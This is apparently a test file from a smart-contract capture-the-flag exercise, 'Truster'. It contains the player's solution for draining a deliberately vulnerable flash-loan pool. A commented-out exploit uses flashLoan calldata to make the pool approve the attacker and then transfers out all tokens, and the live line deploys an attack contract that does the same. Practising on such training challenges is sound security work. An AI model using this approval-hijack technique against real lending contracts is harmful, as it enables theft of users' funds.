const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // do it with EOA
        // let abi = new ethers.utils.Interface(['function approve(address,uint256)']);
        // await pool.connect(player).flashLoan(0, player.address, token.address, abi.encodeFunctionData('approve', [player.address, TOKENS_IN_POOL]));
        // await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);

        // do it in one transaction with a smart contract
        await (await ethers.getContractFactory('TakeAllTruster', player)).deploy(token.address, pool.address, player.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(0);
    });
});
